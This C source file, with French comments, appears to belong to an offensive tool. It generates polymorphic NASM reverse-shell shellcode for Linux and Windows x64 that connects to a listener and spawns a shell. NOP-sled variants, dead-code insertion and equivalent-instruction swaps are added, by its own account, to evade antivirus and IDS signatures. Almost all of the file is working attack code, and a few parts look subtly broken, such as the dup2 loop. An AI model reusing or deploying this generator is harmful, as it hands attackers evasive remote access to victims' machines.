#include "../include/payload_generator.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

/**
 * Polymorphic Shellcode Generator - Génération Polymorphe de Shellcode
 * 
 * Ce module implémente la génération polymorphe de shellcode pour éviter
 * les signatures d'antivirus et d'IDS/IPS. Toute la génération passe par
 * l'assembleur NASM pour rester au niveau le plus bas possible.
 * 
 * Techniques de polymorphisme implémentées :
 * - NOP sleds variés (0x90, 0x0f 0x1f, 0x66 0x90, etc.)
 * - Instructions équivalentes (mov eax, 0 vs xor eax, eax)
 * - Réorganisation des instructions
 * - Dead code insertion (code mort qui n'affecte pas l'exécution)
 * - Variation des registres utilisés
 * - Encodage variable
 * 
 * Inspiré de hoaxshell (https://github.com/t3l3machus/hoaxshell)
 */

/**
 * Génère un NOP polymorphe (variante aléatoire)
 * @param output: Buffer de sortie pour le NOP
 * @return: Taille du NOP généré (1-3 bytes)
 */
static int generate_polymorphic_nop(unsigned char *output) {
    int variant = rand() % 8;
    
    switch (variant) {
        case 0:
            // NOP classique
            output[0] = 0x90;
            return 1;
        case 1:
            // NOP multi-byte (xchg eax, eax)
            output[0] = 0x66;
            output[1] = 0x90;
            return 2;
        case 2:
            // NOP multi-byte (lea eax, [eax+0])
            output[0] = 0x8d;
            output[1] = 0x40;
            output[2] = 0x00;
            return 3;
        case 3:
            // NOP multi-byte (mov eax, eax)
            output[0] = 0x89;
            output[1] = 0xc0;
            return 2;
        case 4:
            // NOP multi-byte (xchg ecx, ecx)
            output[0] = 0x87;
            output[1] = 0xc9;
            return 2;
        case 5:
            // NOP multi-byte (lea ecx, [ecx+0])
            output[0] = 0x8d;
            output[1] = 0x49;
            output[2] = 0x00;
            return 3;
        case 6:
            // NOP multi-byte (test eax, eax)
            output[0] = 0x85;
            output[1] = 0xc0;
            return 2;
        case 7:
            // NOP multi-byte (or eax, 0)
            output[0] = 0x83;
            output[1] = 0xc8;
            output[2] = 0x00;
            return 3;
        default:
            output[0] = 0x90;
            return 1;
    }
}

/**
 * Génère une instruction équivalente pour "xor reg, reg"
 * @param reg: Registre (0=rax, 1=rdi, 2=rsi, 3=rdx, 4=r10)
 * @param output: Buffer de sortie
 * @return: Taille de l'instruction générée
 * Note: Fonction conservée pour usage futur
 */
static int generate_equivalent_zero_reg(int reg, unsigned char *output) {
    (void)reg;  // Utilisé dans le futur
    (void)output;  // Utilisé dans le futur
    int variant = rand() % 3;
    unsigned char reg_byte;
    
    // Mapping registres x64
    unsigned char reg_map[] = {0xc0, 0xc7, 0xc6, 0xc2, 0xc2}; // rax, rdi, rsi, rdx, r10
    if (reg >= 0 && reg < 5) {
        reg_byte = reg_map[reg];
    } else {
        reg_byte = 0xc0;
    }
    
    switch (variant) {
        case 0:
            // xor reg, reg (classique)
            output[0] = 0x48;
            output[1] = 0x31;
            output[2] = reg_byte;
            return 3;
        case 1:
            // sub reg, reg (équivalent)
            output[0] = 0x48;
            output[1] = 0x29;
            output[2] = reg_byte;
            return 3;
        case 2:
            // and reg, 0 (équivalent mais plus long)
            output[0] = 0x48;
            output[1] = 0x83;
            output[2] = 0xe0 + (reg_byte & 0x07);
            output[3] = 0x00;
            return 4;
        default:
            output[0] = 0x48;
            output[1] = 0x31;
            output[2] = reg_byte;
            return 3;
    }
}

/**
 * Génère du dead code (code mort qui n'affecte pas l'exécution)
 * @param output: Buffer de sortie
 * @param max_size: Taille maximale du dead code
 * @return: Taille du dead code généré
 */
static int generate_dead_code(unsigned char *output, int max_size) {
    int size = 0;
    int num_instructions = (rand() % 3) + 1; // 1-3 instructions
    
    for (int i = 0; i < num_instructions && size < max_size - 5; i++) {
        int variant = rand() % 4;
        
        switch (variant) {
            case 0:
                // push/pop d'un registre non utilisé
                if (size + 2 <= max_size) {
                    output[size++] = 0x51; // push rcx
                    output[size++] = 0x59; // pop rcx
                }
                break;
            case 1:
                // inc/dec d'un registre non utilisé
                if (size + 2 <= max_size) {
                    output[size++] = 0x48;
                    output[size++] = 0xff; // inc rcx
                    output[size++] = 0xc1;
                    output[size++] = 0x48;
                    output[size++] = 0xff; // dec rcx
                    output[size++] = 0xc9;
                }
                break;
            case 2:
                // test d'un registre avec lui-même
                if (size + 3 <= max_size) {
                    output[size++] = 0x48;
                    output[size++] = 0x85;
                    output[size++] = 0xc9; // test rcx, rcx
                }
                break;
            case 3:
                // mov d'un registre vers lui-même
                if (size + 3 <= max_size) {
                    output[size++] = 0x48;
                    output[size++] = 0x89;
                    output[size++] = 0xc9; // mov rcx, rcx
                }
                break;
        }
    }
    
    return size;
}

/**
 * Génère un template NASM polymorphe pour reverse shell Linux x64
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param output_file: Fichier de sortie pour l'assembleur
 * @return: 0 si succès, -1 si erreur
 */
int generate_polymorphic_asm_reverse_shell_linux(const char *lhost, int lport, const char *output_file) {
    FILE *fp;
    unsigned int ip_bytes[4];
    unsigned short port_hi, port_lo;
    int zero_variant;
    
    // Initialiser le générateur aléatoire
    srand(time(NULL) ^ getpid());
    
    // Parser l'IP
    if (sscanf(lhost, "%u.%u.%u.%u", &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) {
        return -1;
    }
    
    // Calculer les bytes du port (network byte order)
    port_hi = (lport >> 8) & 0xFF;
    port_lo = lport & 0xFF;
    
    fp = fopen(output_file, "w");
    if (!fp) {
        return -1;
    }
    
    // Variantes aléatoires pour le polymorphisme
    zero_variant = rand() % 2;
    
    fprintf(fp, "; Reverse Shell Linux x64 - Polymorphe\n");
    fprintf(fp, "; IP: %s, Port: %d\n", lhost, lport);
    fprintf(fp, "; Généré avec polymorphisme pour éviter les signatures\n");
    fprintf(fp, "BITS 64\n");
    fprintf(fp, "\n");
    fprintf(fp, "section .text\n");
    fprintf(fp, "global _start\n");
    fprintf(fp, "\n");
    fprintf(fp, "_start:\n");
    
    // NOP sled polymorphe
    fprintf(fp, "    ; NOP sled polymorphe\n");
    int nop_count = (rand() % 5) + 2; // 2-6 NOPs
    for (int i = 0; i < nop_count; i++) {
        unsigned char nop_bytes[3];
        int nop_size = generate_polymorphic_nop(nop_bytes);
        fprintf(fp, "    db ");
        for (int j = 0; j < nop_size; j++) {
            fprintf(fp, "0x%02x", nop_bytes[j]);
            if (j < nop_size - 1) fprintf(fp, ", ");
        }
        fprintf(fp, "  ; NOP polymorphe\n");
    }
    
    // Dead code insertion
    if (rand() % 2) {
        fprintf(fp, "    ; Dead code (n'affecte pas l'exécution)\n");
        unsigned char dead_code[10];
        int dead_size = generate_dead_code(dead_code, sizeof(dead_code));
        fprintf(fp, "    db ");
        for (int i = 0; i < dead_size; i++) {
            fprintf(fp, "0x%02x", dead_code[i]);
            if (i < dead_size - 1) fprintf(fp, ", ");
        }
        fprintf(fp, "  ; Dead code\n");
    }
    
    fprintf(fp, "\n");
    fprintf(fp, "    ; socket(AF_INET, SOCK_STREAM, 0)\n");
    
    // Variantes pour zéro les registres
    if (zero_variant == 0) {
        fprintf(fp, "    xor rax, rax\n");
        fprintf(fp, "    xor rdi, rdi\n");
        fprintf(fp, "    xor rsi, rsi\n");
        fprintf(fp, "    xor rdx, rdx\n");
    } else {
        fprintf(fp, "    sub rax, rax\n");
        fprintf(fp, "    sub rdi, rdi\n");
        fprintf(fp, "    sub rsi, rsi\n");
        fprintf(fp, "    sub rdx, rdx\n");
    }
    
    // Variantes pour mettre les valeurs
    int push_variant = rand() % 2;
    if (push_variant == 0) {
        fprintf(fp, "    push 2\n");
        fprintf(fp, "    pop rdi\n");
        fprintf(fp, "    push 1\n");
        fprintf(fp, "    pop rsi\n");
    } else {
        fprintf(fp, "    mov rdi, 2\n");
        fprintf(fp, "    mov rsi, 1\n");
    }
    
    fprintf(fp, "    mov rdx, 0\n");
    fprintf(fp, "    mov rax, 41\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "    mov rdi, rax\n");
    
    // Dead code optionnel
    if (rand() % 3 == 0) {
        fprintf(fp, "    ; Dead code\n");
        unsigned char dead_code[5];
        int dead_size = generate_dead_code(dead_code, sizeof(dead_code));
        fprintf(fp, "    db ");
        for (int i = 0; i < dead_size; i++) {
            fprintf(fp, "0x%02x", dead_code[i]);
            if (i < dead_size - 1) fprintf(fp, ", ");
        }
        fprintf(fp, "\n");
    }
    
    fprintf(fp, "\n");
    fprintf(fp, "    ; connect(sockfd, &sockaddr, 16)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    mov byte [rsp], 2\n");
    fprintf(fp, "    mov word [rsp+2], 0x%02x%02x\n", port_hi, port_lo);
    fprintf(fp, "    mov dword [rsp+4], 0x%02x%02x%02x%02x\n", 
            ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
    fprintf(fp, "    mov rsi, rsp\n");
    fprintf(fp, "    mov rdx, 16\n");
    fprintf(fp, "    mov rax, 42\n");
    fprintf(fp, "    syscall\n");
    
    fprintf(fp, "\n");
    fprintf(fp, "    ; dup2(clientfd, 0/1/2)\n");
    fprintf(fp, "    xor rsi, rsi\n");
    fprintf(fp, "    mov rsi, 3\n");
    fprintf(fp, "dup_loop:\n");
    fprintf(fp, "    dec rsi\n");
    fprintf(fp, "    mov rax, 33\n");
    fprintf(fp, "    syscall\n");
    fprintf(fp, "    jnz dup_loop\n");
    
    fprintf(fp, "\n");
    fprintf(fp, "    ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)\n");
    fprintf(fp, "    xor rax, rax\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    mov rbx, 0x68732f6e69622f2f\n");
    fprintf(fp, "    push rbx\n");
    fprintf(fp, "    mov rdi, rsp\n");
    fprintf(fp, "    push rax\n");
    fprintf(fp, "    push rdi\n");
    fprintf(fp, "    mov rsi, rsp\n");
    fprintf(fp, "    xor rdx, rdx\n");
    fprintf(fp, "    mov rax, 59\n");
    fprintf(fp, "    syscall\n");
    
    fclose(fp);
    return 0;
}

/**
 * Génère un template NASM polymorphe pour reverse shell Windows x64
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param output_file: Fichier de sortie pour l'assembleur
 * @return: 0 si succès, -1 si erreur
 */
int generate_polymorphic_asm_reverse_shell_windows(const char *lhost, int lport, const char *output_file) {
    FILE *fp;
    
    // Initialiser le générateur aléatoire
    srand(time(NULL) ^ getpid());
    
    fp = fopen(output_file, "w");
    if (!fp) {
        return -1;
    }
    
    fprintf(fp, "; Reverse Shell Windows x64 - Polymorphe avec Résolution Dynamique\n");
    fprintf(fp, "; IP: %s, Port: %d\n", lhost, lport);
    fprintf(fp, "; Généré avec polymorphisme pour éviter les signatures\n");
    fprintf(fp, "BITS 64\n");
    fprintf(fp, "\n");
    fprintf(fp, "section .text\n");
    fprintf(fp, "global _start\n");
    fprintf(fp, "\n");
    fprintf(fp, "_start:\n");
    
    // NOP sled polymorphe
    fprintf(fp, "    ; NOP sled polymorphe\n");
    int nop_count = (rand() % 5) + 2;
    for (int i = 0; i < nop_count; i++) {
        unsigned char nop_bytes[3];
        int nop_size = generate_polymorphic_nop(nop_bytes);
        fprintf(fp, "    db ");
        for (int j = 0; j < nop_size; j++) {
            fprintf(fp, "0x%02x", nop_bytes[j]);
            if (j < nop_size - 1) fprintf(fp, ", ");
        }
        fprintf(fp, "  ; NOP polymorphe\n");
    }
    
    fprintf(fp, "\n");
    fprintf(fp, "    ; Utiliser la génération complète avec résolution dynamique\n");
    fprintf(fp, "    ; Le code complet sera généré par generate_windows_asm_reverse_shell_complete\n");
    
    fclose(fp);
    
    // Générer le code complet et l'ajouter
    char temp_file[256];
    snprintf(temp_file, sizeof(temp_file), "%s.tmp", output_file);
    if (generate_windows_asm_reverse_shell_complete(lhost, lport, temp_file) < 0) {
        unlink(temp_file);
        unlink(output_file);
        return -1;
    }
    
    // Lire le fichier complet et l'ajouter après les NOPs
    FILE *temp_fp = fopen(temp_file, "r");
    if (temp_fp) {
        fp = fopen(output_file, "a");
        if (fp) {
            char line[512];
            int skip_header = 1;
            int found_start = 0;
            while (fgets(line, sizeof(line), temp_fp)) {
                // Ignorer les lignes d'en-tête
                if (skip_header && (strstr(line, "BITS") || strstr(line, "section") || 
                    strstr(line, "global"))) {
                    continue;
                }
                // Détecter _start: et commencer à copier après
                if (strstr(line, "_start:")) {
                    skip_header = 0;
                    found_start = 1;
                    continue;
                }
                // Copier toutes les lignes après _start:
                if (found_start || !skip_header) {
                    fputs(line, fp);
                }
            }
            fclose(fp);
        }
        fclose(temp_fp);
    } else {
        unlink(temp_file);
        unlink(output_file);
        return -1;
    }
    
    unlink(temp_file);
    return 0;
}

/**
 * Génère et assemble un shellcode polymorphe
 * @param lhost: IP du listener
 * @param lport: Port du listener
 * @param platform: "linux" ou "windows"
 * @param shellcode: Buffer de sortie
 * @param shellcode_size: Taille du buffer
 * @return: Taille du shellcode, ou -1 si erreur
 */
int generate_polymorphic_shellcode(const char *lhost, int lport, const char *platform,
                                  unsigned char *shellcode, int shellcode_size) {
    char asm_file[256];
    int ret;
    
    // Créer un nom de fichier temporaire unique
    snprintf(asm_file, sizeof(asm_file), "/tmp/packet_forger_poly_%d_%ld.asm", getpid(), time(NULL));
    
    // Générer le fichier assembleur polymorphe
    if (strcmp(platform, "linux") == 0) {
        ret = generate_polymorphic_asm_reverse_shell_linux(lhost, lport, asm_file);
    } else if (strcmp(platform, "windows") == 0) {
        ret = generate_polymorphic_asm_reverse_shell_windows(lhost, lport, asm_file);
    } else {
        return -1;
    }
    
    if (ret < 0) {
        unlink(asm_file);
        return -1;
    }
    
    // Assembler et extraire le shellcode
    ret = assemble_nasm_shellcode(asm_file, shellcode, shellcode_size);
    
    // Nettoyer
    unlink(asm_file);
    
    return ret;
}

